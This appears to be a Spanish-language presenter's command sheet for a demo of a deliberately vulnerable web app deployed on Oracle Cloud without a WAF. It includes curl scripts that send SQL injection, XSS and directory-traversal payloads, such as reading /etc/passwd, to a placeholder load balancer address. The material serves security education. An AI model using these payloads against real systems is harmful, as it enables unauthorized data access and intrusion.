# 🎯 Comandos Rápidos para la Demo SIN WAF

## 🚀 Despliegue Rápido

```bash
# 1. Desplegar infraestructura SIN WAF
./deploy-sin-waf.sh

# 2. Verificar que todo esté funcionando
./scripts/quick-demo-check.sh

# 3. Validar vulnerabilidades
./scripts/validate-vulnerabilities.sh http://[IP_LOAD_BALANCER]
```

## 🌐 Obtener Información de la Infraestructura

```bash
# Obtener IP del Load Balancer
terraform output load_balancer_fqdn

# Ver todos los outputs
terraform output

# Ver estado de los recursos
terraform state list
```

## 🔍 Comandos para la Demo en Vivo

### Análisis de Headers HTTP
```bash
# Ver headers de seguridad (ausentes)
curl -I http://[IP_LOAD_BALANCER]

# Ver tecnologías expuestas
curl -s http://[IP_LOAD_BALANCER] | grep -i "powered\|server\|version"
```

### Test de SQL Injection
```bash
# Consulta normal
curl -s "http://[IP_LOAD_BALANCER]/?demo=sql&user_id=1"

# SQL Injection básico
curl -s "http://[IP_LOAD_BALANCER]/?demo=sql&user_id=1'"

# SQL Injection bypass
curl -s "http://[IP_LOAD_BALANCER]/?demo=sql&user_id=1' OR '1'='1"
```

### Test de Cross-Site Scripting (XSS)
```bash
# Comentario normal
curl -s "http://[IP_LOAD_BALANCER]/?demo=xss&comment=Hola mundo"

# XSS básico
curl -s "http://[IP_LOAD_BALANCER]/?demo=xss&comment=<script>alert('XSS')</script>"

# XSS con img
curl -s "http://[IP_LOAD_BALANCER]/?demo=xss&comment=<img src=x onerror=alert(1)>"
```

### Test de Directory Traversal
```bash
# Archivo normal
curl -s "http://[IP_LOAD_BALANCER]/?demo=path&file=test.txt"

# Directory traversal
curl -s "http://[IP_LOAD_BALANCER]/?demo=path&file=../../etc/passwd"

# Directory traversal profundo
curl -s "http://[IP_LOAD_BALANCER]/?demo=path&file=../../../etc/hosts"
```

## 🎭 Scripts de Presentación

### Script 1: Análisis Completo
```bash
#!/bin/bash
# Análisis completo de la aplicación vulnerable

URL="http://[IP_LOAD_BALANCER]"

echo "🔍 ANÁLISIS DE VULNERABILIDADES"
echo "==============================="

echo "1. Headers HTTP:"
curl -I $URL

echo -e "\n2. Tecnologías expuestas:"
curl -s $URL | grep -i "powered\|server\|version"

echo -e "\n3. Test SQL Injection:"
curl -s "$URL/?demo=sql&user_id=1'" | grep -i "vulnerabilidad"

echo -e "\n4. Test XSS:"
curl -s "$URL/?demo=xss&comment=<script>alert(1)</script>" | grep -i "vulnerabilidad"

echo -e "\n5. Test Directory Traversal:"
curl -s "$URL/?demo=path&file=../../etc/passwd" | grep -i "vulnerabilidad"
```

### Script 2: Demo Interactiva
```bash
#!/bin/bash
# Demo interactiva con pausas dramáticas

URL="http://[IP_LOAD_BALANCER]"

echo "🎭 DEMO INTERACTIVA DE VULNERABILIDADES"
echo "======================================"

echo "Paso 1: Análisis de headers..."
curl -I $URL
echo "Presiona Enter para continuar..."
read

echo "Paso 2: SQL Injection..."
echo "Probando: 1' OR '1'='1"
curl -s "$URL/?demo=sql&user_id=1' OR '1'='1"
echo "Presiona Enter para continuar..."
read

echo "Paso 3: XSS..."
echo "Probando: <script>alert('XSS')</script>"
curl -s "$URL/?demo=xss&comment=<script>alert('XSS')</script>"
echo "Presiona Enter para continuar..."
read

echo "Paso 4: Directory Traversal..."
echo "Probando: ../../etc/passwd"
curl -s "$URL/?demo=path&file=../../etc/passwd"
```

## 🛠️ Comandos de Troubleshooting

### Verificar Estado de Recursos
```bash
# Ver todos los recursos desplegados
terraform state list

# Ver detalles de un recurso específico
terraform state show oci_load_balancer_load_balancer.public_lb

# Ver logs de despliegue
terraform show
```

### Verificar Conectividad
```bash
# Test de conectividad básica
ping [IP_LOAD_BALANCER]

# Test de puerto HTTP
telnet [IP_LOAD_BALANCER] 80

# Test con curl
curl -v http://[IP_LOAD_BALANCER]
```

### Verificar Aplicación
```bash
# Verificar que la aplicación responde
curl -s http://[IP_LOAD_BALANCER] | grep -i "demo.*vulnerabilidad"

# Verificar health check
curl -s http://[IP_LOAD_BALANCER]/health

# Verificar logs de la aplicación
terraform output connection_info
```

## 🧹 Limpieza Post-Demo

```bash
# Destruir toda la infraestructura
terraform destroy -var-file="terraform-SIN-WAF.tfvars" -auto-approve

# Verificar que no queden recursos
terraform state list

# Limpiar archivos temporales
rm -f tfplan-sin-waf
```

## 📊 URLs para la Demo

### En el Navegador
- **Aplicación principal**: `http://[IP_LOAD_BALANCER]`
- **Demo SQL Injection**: `http://[IP_LOAD_BALANCER]/?demo=sql&user_id=1' OR '1'='1`
- **Demo XSS**: `http://[IP_LOAD_BALANCER]/?demo=xss&comment=<script>alert('XSS')</script>`
- **Demo Directory Traversal**: `http://[IP_LOAD_BALANCER]/?demo=path&file=../../etc/passwd`

### Comandos Curl Equivalentes
```bash
# Reemplazar [IP_LOAD_BALANCER] con la IP real
LB_IP=$(terraform output -raw load_balancer_fqdn)

# Ejemplos de uso
curl -s "http://$LB_IP/?demo=sql&user_id=1' OR '1'='1"
curl -s "http://$LB_IP/?demo=xss&comment=<script>alert('XSS')</script>"
curl -s "http://$LB_IP/?demo=path&file=../../etc/passwd"
```

## 🎯 Tips para la Presentación

1. **Preparar URLs**: Tener las URLs en favoritos del navegador
2. **Comandos listos**: Tener los comandos curl copiados en el portapapeles
3. **Screenshots de respaldo**: Por si falla la conectividad
4. **Cronometrar**: Cada sección debe tomar el tiempo asignado
5. **Interactuar**: Hacer preguntas a la audiencia durante la demo

## 📱 Checklist Pre-Demo

- [ ] Infraestructura desplegada y funcionando
- [ ] URLs verificadas y accesibles
- [ ] Comandos probados y funcionando
- [ ] Navegador configurado con pestañas abiertas
- [ ] Terminal con comandos listos
- [ ] Guía de presentación revisada
- [ ] Screenshots de respaldo preparados
- [ ] Tiempo cronometrado para cada sección 